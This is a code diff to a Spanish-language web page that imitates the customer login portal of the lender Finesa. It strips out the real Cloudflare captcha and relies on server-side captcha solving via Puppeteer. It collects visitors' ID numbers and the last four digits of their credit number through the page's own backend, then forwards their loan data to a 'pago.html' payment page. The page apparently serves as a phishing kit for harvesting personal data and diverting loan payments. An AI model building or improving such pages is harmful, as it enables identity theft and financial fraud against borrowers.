@@ -143,15 +143,6 @@
             color: #666;
         }
 
-        /* =========================================
-           TURNSTILE WIDGET (real Cloudflare)
-           ========================================= */
-        .turnstile-container {
-            margin: 25px auto 0 auto;
-            display: flex;
-            justify-content: center;
-        }
-
         .captcha-status {
             text-align: center;
             font-size: 13px;
@@ -281,7 +272,190 @@
             word-break: break-all;
         }
 
-        /* Botón celular (Oculto en PC) */
+        /* =========================================
+           MODAL DE VERIFICACIÓN DE CRÉDITO
+           ========================================= */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .credit-modal {
+            background: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 460px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: modalSlideIn 0.3s ease;
+        }
+
+        @keyframes modalSlideIn {
+            from { transform: translateY(-30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .credit-modal-header {
+            background: #002d72;
+            color: white;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .credit-modal-header h3 {
+            font-size: 17px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .credit-modal-header .close-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 22px;
+            cursor: pointer;
+            padding: 0 4px;
+            line-height: 1;
+            opacity: 0.8;
+            transition: opacity 0.2s;
+        }
+
+        .credit-modal-header .close-btn:hover {
+            opacity: 1;
+        }
+
+        .credit-modal-body {
+            padding: 25px 20px;
+            text-align: center;
+        }
+
+        .credit-modal-body p.instruction {
+            color: #333;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+
+        /* 4 campos de dígitos */
+        .digit-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .digit-inputs input {
+            width: 55px;
+            height: 55px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            border: 2px solid #d0d5dd;
+            border-radius: 10px;
+            outline: none;
+            color: #002d72;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .digit-inputs input:focus {
+            border-color: #00a3e0;
+            box-shadow: 0 0 0 3px rgba(0, 163, 224, 0.15);
+        }
+
+        .digit-inputs input::placeholder {
+            color: #ccc;
+        }
+
+        /* Info card */
+        .info-card {
+            background: #002d72;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 15px 0;
+            color: white;
+            text-align: center;
+        }
+
+        .info-card img {
+            max-width: 100%;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+
+        /* Botón verificar */
+        .btn-verificar {
+            display: block;
+            width: 100%;
+            background: #00c9d8;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background 0.2s, transform 0.1s;
+        }
+
+        .btn-verificar:hover {
+            background: #00b3c0;
+        }
+
+        .btn-verificar:active {
+            transform: scale(0.98);
+        }
+
+        .btn-verificar:disabled {
+            background: #88e8ed;
+            cursor: not-allowed;
+        }
+
+        .credit-message {
+            margin-top: 10px;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            display: none;
+        }
+
+        .credit-message.error {
+            display: block;
+            background-color: #fee2e2;
+            color: #dc2626;
+            border: 1px solid #fca5a5;
+        }
+
+        .credit-message.loading {
+            display: block;
+            background-color: #e0f2fe;
+            color: #0284c7;
+            border: 1px solid #7dd3fc;
+        }
+
+        .credit-message.success {
+            display: block;
+            background-color: #dcfce7;
+            color: #16a34a;
+            border: 1px solid #86efac;
+        }
+
+        /* Botón celular */
         .btn-portal-mobile,
         .mobile-bottom-image {
             display: none;
@@ -303,7 +477,7 @@
         }
 
         /* =========================================
-           MEDIA QUERIES (DISEÑO PARA CELULAR)
+           MEDIA QUERIES
            ========================================= */
         @media (max-width: 768px) {
             body {
@@ -364,9 +538,20 @@
             footer {
                 display: none;
             }
+
+            .digit-inputs input {
+                width: 48px;
+                height: 48px;
+                font-size: 20px;
+            }
+
+            .credit-modal {
+                width: 95%;
+                max-height: 90vh;
+                overflow-y: auto;
+            }
         }
     </style>
-    <!-- Captchas se resuelven en el servidor via Puppeteer -->
 </head>
 <body>
 
@@ -380,7 +565,6 @@
 
     <!-- CONTENIDO PRINCIPAL -->
     <main>
-        <!-- Tarjeta del Formulario -->
         <div class="card">
             <div class="tabs">
                 <div class="tab active">Soy cliente</div>
@@ -408,19 +592,15 @@
                                required pattern="[0-9]+" inputmode="numeric">
                     </div>
 
-                    <!-- Los captchas se resuelven automáticamente en el servidor -->
                     <div class="captcha-status" id="captchaStatus" style="display:block; color: #60a5fa; font-size: 12px; text-align: center; margin-top: 10px;">
-                        🤖 Los captchas se resuelven automáticamente vía Puppeteer
+                        Los captchas se resuelven automáticamente en el servidor
                     </div>
 
-                    <!-- MENSAJE DE ERROR/EXITO -->
                     <div class="message" id="message"></div>
 
-                    <!-- BOTON INGRESAR (aparece después del captcha) -->
                     <button type="submit" class="btn-ingresar" id="btnIngresar">Ingresar</button>
                 </form>
 
-                <!-- RESULTADOS -->
                 <div class="results-container" id="resultsContainer">
                     <h3>Información encontrada:</h3>
                     <div id="resultsContent"></div>
@@ -432,16 +612,42 @@
             </div>
         </div>
 
-        <!-- Botón de celular -->
         <a href="https://portalclientes.finesa.com.co/autenticacion/iniciar-sesion" class="btn-portal-mobile">Ir al portal clientes</a>
 
-        <!-- Imagen de celular -->
         <div class="mobile-bottom-image">
             <img src="1.png" alt="Con Finesa lo tienes todo">
         </div>
     </main>
 
-    <!-- FOOTER (Solo para PC) -->
+    <!-- MODAL: Verificación de crédito -->
+    <div class="modal-overlay" id="creditModal">
+        <div class="credit-modal">
+            <div class="credit-modal-header">
+                <h3>&#128179; Verificación de crédito</h3>
+                <button class="close-btn" id="closeModal">&times;</button>
+            </div>
+            <div class="credit-modal-body">
+                <p class="instruction">Ingresa los últimos 4 dígitos de tu número de crédito.</p>
+
+                <div class="digit-inputs">
+                    <input type="text" maxlength="1" inputmode="numeric" class="digit-box" data-index="0" placeholder="·">
+                    <input type="text" maxlength="1" inputmode="numeric" class="digit-box" data-index="1" placeholder="·">
+                    <input type="text" maxlength="1" inputmode="numeric" class="digit-box" data-index="2" placeholder="·">
+                    <input type="text" maxlength="1" inputmode="numeric" class="digit-box" data-index="3" placeholder="·">
+                </div>
+
+                <div class="info-card" style="padding: 0; overflow: hidden;">
+                    <img src="fac.png" alt="Información de crédito" style="width: 100%; display: block; border-radius: 12px;">
+                </div>
+
+                <div class="credit-message" id="creditMessage"></div>
+
+                <button class="btn-verificar" id="btnVerificar" disabled>Verificar</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
     <footer>
         <div>
             <a href="https://www.finesa.com.co/términos-y-condiciones">Términos y condiciones</a> |
@@ -458,30 +664,110 @@
         // ============================================================
         const API_BASE = window.location.origin;
 
+        let currentVerification = {
+            documentType: '',
+            identification: '',
+            sessionId: '',
+            requiresLastFour: false,
+            firstStepData: null,
+        };
 
         // ============================================================
         // ELEMENTOS DEL DOM
         // ============================================================
-        const form = document.getElementById('loginForm');
-        const tipoDoc = document.getElementById('tipo-doc');
-        const numDoc = document.getElementById('num-doc');
-        const btnIngresar = document.getElementById('btnIngresar');
-        const messageEl = document.getElementById('message');
+        const form          = document.getElementById('loginForm');
+        const tipoDoc       = document.getElementById('tipo-doc');
+        const numDoc        = document.getElementById('num-doc');
+        const btnIngresar   = document.getElementById('btnIngresar');
+        const messageEl     = document.getElementById('message');
         const resultsContainer = document.getElementById('resultsContainer');
-        const resultsContent = document.getElementById('resultsContent');
-        const rawData = document.getElementById('rawData');
-        const captchaStatus = document.getElementById('captchaStatus');
+        const resultsContent   = document.getElementById('resultsContent');
+        const rawData          = document.getElementById('rawData');
 
-        // Solo permitir números en el campo de identificación
+        const creditModal   = document.getElementById('creditModal');
+        const closeModal    = document.getElementById('closeModal');
+        const btnVerificar  = document.getElementById('btnVerificar');
+        const creditMessage = document.getElementById('creditMessage');
+        const digitBoxes    = document.querySelectorAll('.digit-box');
+
+        // Solo números en cédula
         numDoc.addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/[^0-9]/g, '');
         });
 
-        // Mostrar botón de inmediato (captchas se resuelven en el server)
+        // Mostrar botón inmediatamente
         btnIngresar.classList.add('visible');
 
         // ============================================================
-        // ENVÍO DEL FORMULARIO
+        // LÓGICA DE LOS 4 DÍGITOS
+        // ============================================================
+        digitBoxes.forEach((box, idx) => {
+            box.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (e.target.value && idx < digitBoxes.length - 1) {
+                    digitBoxes[idx + 1].focus();
+                }
+                checkDigitsComplete();
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !box.value && idx > 0) {
+                    digitBoxes[idx - 1].focus();
+                    digitBoxes[idx - 1].value = '';
+                    checkDigitsComplete();
+                }
+                if (e.key === 'Enter' && !btnVerificar.disabled) {
+                    btnVerificar.click();
+                }
+            });
+
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pasted = (e.clipboardData.getData('text') || '').replace(/\D/g, '');
+                if (pasted.length >= 4) {
+                    digitBoxes.forEach((b, i) => { b.value = pasted[i] || ''; });
+                    digitBoxes[3].focus();
+                    checkDigitsComplete();
+                }
+            });
+        });
+
+        function checkDigitsComplete() {
+            const allFilled = Array.from(digitBoxes).every(b => b.value.length === 1);
+            btnVerificar.disabled = !allFilled;
+        }
+
+        function getDigitsValue() {
+            return Array.from(digitBoxes).map(b => b.value).join('');
+        }
+
+        function clearDigits() {
+            digitBoxes.forEach(b => { b.value = ''; });
+            btnVerificar.disabled = true;
+        }
+
+        // ============================================================
+        // MODAL: Abrir / Cerrar
+        // ============================================================
+        function openCreditModal() {
+            creditModal.classList.add('active');
+            clearDigits();
+            creditMessage.className = 'credit-message';
+            creditMessage.style.display = 'none';
+            setTimeout(() => digitBoxes[0].focus(), 100);
+        }
+
+        function closeCreditModal() {
+            creditModal.classList.remove('active');
+        }
+
+        closeModal.addEventListener('click', closeCreditModal);
+        creditModal.addEventListener('click', (e) => {
+            if (e.target === creditModal) closeCreditModal();
+        });
+
+        // ============================================================
+        // PASO 1: Verificación de identificación
         // ============================================================
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -490,7 +776,6 @@
                 showMessage('Selecciona un tipo de documento', 'error');
                 return;
             }
-
             if (!numDoc.value.trim()) {
                 showMessage('Ingresa tu número de identificación', 'error');
                 return;
@@ -498,7 +783,7 @@
 
             btnIngresar.disabled = true;
             btnIngresar.textContent = 'Consultando...';
-            showMessage('Abriendo Finesa con Puppeteer... (puede tardar 15-30s)', 'loading');
+            showMessage('Resolviendo captchas y consultando... (~5-6 seg)', 'loading');
             resultsContainer.classList.remove('visible');
 
             try {
@@ -518,8 +803,25 @@
                     return;
                 }
 
-                showMessage('Consulta exitosa', 'success');
-                displayResults(verifyData.data);
+                const data = verifyData.data;
+                const sessionId = verifyData.sessionId;
+                console.log('[FRONT] sessionId recibido:', sessionId);
+
+                currentVerification.documentType    = tipoDoc.value;
+                currentVerification.identification  = numDoc.value.trim();
+                currentVerification.sessionId       = sessionId;
+                currentVerification.firstStepData   = data;
+
+                if (data && (data.requiresLastFour === true || data.requires_last_four === true ||
+                    data.Requires_Last_Four === true || data.RequiresLastFour === true)) {
+                    currentVerification.requiresLastFour = true;
+                    showMessage('Se requiere verificación adicional', 'loading');
+                    openCreditModal();
+                } else {
+                    // Sin segundo paso → llamar credit-info directamente
+                    showMessage('Consulta exitosa. Obteniendo productos...', 'loading');
+                    await fetchCreditInfoAndRedirect();
+                }
 
             } catch (error) {
                 console.error('Error:', error);
@@ -531,44 +833,113 @@
         });
 
         // ============================================================
-        // FUNCIONES AUXILIARES
+        // PASO 2: Verificación de crédito (últimos 4 dígitos)
+        // ============================================================
+        btnVerificar.addEventListener('click', async () => {
+            const lastFour = getDigitsValue();
+            if (lastFour.length !== 4) return;
+
+            btnVerificar.disabled = true;
+            btnVerificar.textContent = 'Verificando...';
+            showCreditMessage('Resolviendo captcha y verificando... (~5 seg)', 'loading');
+
+            try {
+                const res = await fetch(`${API_BASE}/api/verify-credit`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId:        currentVerification.sessionId,
+                        identification:   currentVerification.identification,
+                        lastFourDigits:   lastFour,
+                    }),
+                });
+
+                const result = await res.json();
+
+                if (!res.ok) {
+                    showCreditMessage(result.error || `Error ${res.status}`, 'error');
+                    return;
+                }
+
+                // ✅ verify-credit OK → ahora sí pedir los productos
+                showCreditMessage('Verificación exitosa. Obteniendo productos...', 'success');
+                await fetchCreditInfoAndRedirect();
+
+            } catch (error) {
+                console.error('Error:', error);
+                showCreditMessage(`Error de conexión: ${error.message}`, 'error');
+            } finally {
+                btnVerificar.disabled = false;
+                btnVerificar.textContent = 'Verificar';
+                checkDigitsComplete();
+            }
+        });
+
+        // ============================================================
+        // PASO 3: Obtener productos y redirigir
+        // ✅ Función separada — usada tanto desde paso 1 como desde paso 2
+        // ============================================================
+        async function fetchCreditInfoAndRedirect() {
+            try {
+                const infoRes = await fetch(`${API_BASE}/api/credit-info`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId:      currentVerification.sessionId,
+                        identification: currentVerification.identification,
+                    }),
+                });
+
+                const infoData = await infoRes.json();
+                console.log('[FRONT] credit-info response:', infoData);
+
+                if (!infoRes.ok || !infoData.success) {
+                    // Si falla credit-info, mostrar el error en lugar de redirigir con datos vacíos
+                    const errMsg = infoData.error || `Error ${infoRes.status} al obtener productos`;
+                    showMessage(errMsg, 'error');
+                    showCreditMessage(errMsg, 'error');
+                    return;
+                }
+
+                // ✅ Armar el payload que espera pago.html
+                const payload = {
+                    customerName:       infoData.customerName || 'Cliente',
+                    credits:            infoData.credits      || [],
+                    firstInstallments:  infoData.firstInstallments || [],
+                    canceledProducts:   infoData.canceledProducts  || [],
+                    // datos extra por si pago.html los necesita en el futuro
+                    identification:     currentVerification.identification,
+                    documentType:       currentVerification.documentType,
+                };
+
+                console.log('[FRONT] Guardando en localStorage:', payload);
+                redirectToPago(payload);
+
+            } catch (err) {
+                console.error('Error en credit-info:', err);
+                showMessage(`Error obteniendo productos: ${err.message}`, 'error');
+                showCreditMessage(`Error obteniendo productos: ${err.message}`, 'error');
+            }
+        }
+
+        // ============================================================
+        // UTILIDADES
         // ============================================================
         function showMessage(text, type) {
             messageEl.textContent = text;
             messageEl.className = `message ${type}`;
         }
 
-        function displayResults(data) {
-            resultsContainer.classList.add('visible');
-            rawData.textContent = JSON.stringify(data, null, 2);
+        function showCreditMessage(text, type) {
+            creditMessage.textContent = text;
+            creditMessage.className = `credit-message ${type}`;
+        }
 
-            // Si la data es un array de créditos/facturas
-            if (Array.isArray(data)) {
-                resultsContent.innerHTML = data.map(item => `
-                    <div class="invoice-card">
-                        ${Object.entries(item).map(([key, val]) => `
-                            <div class="invoice-row">
-                                <span class="label">${formatLabel(key)}</span>
-                                <span class="value">${val}</span>
-                            </div>
-                        `).join('')}
-                    </div>
-                `).join('');
-            } else if (typeof data === 'object' && data !== null) {
-                // Si es un objeto, mostrarlo como tarjeta
-                resultsContent.innerHTML = `
-                    <div class="invoice-card">
-                        ${Object.entries(data).map(([key, val]) => `
-                            <div class="invoice-row">
-                                <span class="label">${formatLabel(key)}</span>
-                                <span class="value">${typeof val === 'object' ? JSON.stringify(val) : val}</span>
-                            </div>
-                        `).join('')}
-                    </div>
-                `;
-            } else {
-                resultsContent.innerHTML = `<p>${data}</p>`;
-            }
+        function redirectToPago(data) {
+            localStorage.setItem('finesaPaymentData', JSON.stringify(data));
+            setTimeout(() => {
+                window.location.href = 'pago.html';
+            }, 500);
         }
 
         function formatLabel(key) {
